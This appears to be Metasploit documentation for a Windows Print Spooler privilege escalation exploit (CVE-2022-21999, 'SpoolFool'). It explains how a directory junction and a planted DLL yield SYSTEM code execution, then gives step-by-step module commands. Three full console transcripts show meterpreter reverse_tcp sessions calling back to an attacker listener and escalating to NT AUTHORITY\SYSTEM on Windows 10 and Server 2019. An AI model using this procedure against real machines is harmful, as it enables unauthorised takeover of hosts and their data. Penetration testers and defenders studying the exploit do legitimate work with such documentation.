
## Vulnerable Application

The Windows Print Spooler has a privilege escalation vulnerability that
can be leveraged to achieve code execution as SYSTEM.

The `SpoolDirectory`, a configuration setting that holds the path that
a printer's spooled jobs are sent to, is writable for all users, and it can
be configured via `SetPrinterDataEx()` provided the caller has the
`PRINTER_ACCESS_ADMINISTER` permission. If the `SpoolDirectory` path does not
exist, it will be created once the print spooler reinitializes.

Calling `SetPrinterDataEx()` with the `CopyFiles\` registry key will load the
dll passed in as the `pData` argument, meaning that writing a dll to the `SpoolDirectory`
location can be loaded by the print spooler.

Using a directory junction and UNC path for the `SpoolDirectory`, the exploit
writes a payload to `C:\Windows\System32\spool\drivers\x64\4` and loads it
by calling `SetPrinterDataEx()`, resulting in code execution as SYSTEM.

This has been tested on Windows 10 and Windows Server 2019.

## Verification Steps

1. Get a meterpreter session on the target
2. Do: `use exploit/windows/local/cve_2022_21999_spoolfool_privesc`
3. Do: `set SESSION <sess_no>`
4. Do: `set LHOST <lhost>`
5. Do: `set LPORT <port_no>`
6. Do: `run`
7. You should get a meterpreter session with SYSTEM privileges.

## Options

### WAIT_TIME

The time to wait for the print spooler to restart

## Scenarios

### Windows 10 21H2 (Build 19044.1288)

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.98.1:4444
[*] Sending stage (200262 bytes) to 172.16.98.146
[*] Meterpreter session 1 opened (172.16.98.1:4444 -> 172.16.98.146:49674 ) at 2022-03-14 09:02:21 -0500

meterpreter > getuid
Server username: DESKTOP-49N0D8H\shelbypace
meterpreter > sysinfo
Computer        : DESKTOP-49N0D8H
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2022_21999_spoolfool_privesc
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set lhost 172.16.98.1
lhost => 172.16.98.1
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set session 1
session => 1
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > run

[*] Started reverse TCP handler on 172.16.98.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Making base directory: C:\Users\shelbypace\AppData\Local\Temp\sYOsQqHLPd
[+] Printer DZBUma was successfully added.
[*] Setting spool directory: \\localhost\C$\Users\shelbypace\AppData\Local\Temp\sYOsQqHLPd\4
[*] Creating junction point: C:\Users\shelbypace\AppData\Local\Temp\sYOsQqHLPd -> C:\Windows\System32\spool\drivers\x64
[*] Creating the spool directory by restarting spooler...
[*] Attempting to restart print spooler.
[*] Sleeping for 5 seconds.
[+] Directory was successfully created.
[*] Writing payload to C:\Windows\System32\spool\drivers\x64\4\tqDNFaf.dll.
[*] Attempting to set permissions for payload.
[*] Payload should have read / execute permissions now.
[*] Sending stage (200262 bytes) to 172.16.98.146
[*] Meterpreter session 2 opened (172.16.98.1:4444 -> 172.16.98.146:49677 ) at 2022-03-14 09:08:36 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-49N0D8H
OS              : Windows 10 (10.0 Build 19044).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

### Windows 10 1709 (Build 16299)

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.98.1:4444
[*] Sending stage (200262 bytes) to 172.16.98.144
[*] Meterpreter session 1 opened (172.16.98.1:4444 -> 172.16.98.144:49671 ) at 2022-03-11 08:02:46 -0600

meterpreter > getuid
Server username: DESKTOP-EULFBD8\space
meterpreter > sysinfo
Computer        : DESKTOP-EULFBD8
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2022_21999_spoolfool_privesc
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set session 1
session => 1
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set lhost 172.16.98.1
lhost => 172.16.98.1
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > run

[*] Started reverse TCP handler on 172.16.98.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Making base directory: C:\Users\space\AppData\Local\Temp\Xvamagt
[+] Printer ukfoJL was successfully added.
[*] Setting spool directory: \\localhost\C$\Users\space\AppData\Local\Temp\Xvamagt\4
[*] Creating junction point: C:\Users\space\AppData\Local\Temp\Xvamagt -> C:\Windows\System32\spool\drivers\x64
[*] Creating the spool directory by restarting spooler...
[*] Attempting to restart print spooler.
[*] Sleeping for 5 seconds.
[+] Directory was successfully created.
[*] Writing payload to C:\Windows\System32\spool\drivers\x64\4\UYoQz.dll.
[*] Attempting to set permissions for payload.
[*] Payload should have read / execute permissions now.
[*] Sending stage (200262 bytes) to 172.16.98.144
[*] Meterpreter session 2 opened (172.16.98.1:4444 -> 172.16.98.144:49674 ) at 2022-03-11 08:08:32 -0600

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : DESKTOP-EULFBD8
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

## Windows Server 2019 v1809 (Build 17763.1577)

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 172.16.98.1:4444
[*] Sending stage (200262 bytes) to 172.16.98.142
[*] Meterpreter session 1 opened (172.16.98.1:4444 -> 172.16.98.142:49674 ) at 2022-03-10 16:55:26 -0600

meterpreter > getuid
Server username: WIN-VR5A12O80FQ\space
meterpreter > sysinfo
Computer        : WIN-VR5A12O80FQ
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2022_21999_spoolfool_privesc
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set session 1
session => 1
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > set lhost 172.16.98.1
lhost => 172.16.98.1
msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > run

[*] Started reverse TCP handler on 172.16.98.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Making base directory: C:\Users\space\AppData\Local\Temp\ruXuBfgxx
[*] v4 directory already exists.
[*] Writing payload to C:\Windows\System32\spool\drivers\x64\4\dVADJcO.dll
[*] Attempting to set permissions for payload.
[*] Payload should have read / execute permissions now.
[*] Sending stage (200262 bytes) to 172.16.98.142
[*] Meterpreter session 2 opened (172.16.98.1:4444 -> 172.16.98.142:49675 ) at 2022-03-10 17:01:02 -0600

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-VR5A12O80FQ
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```
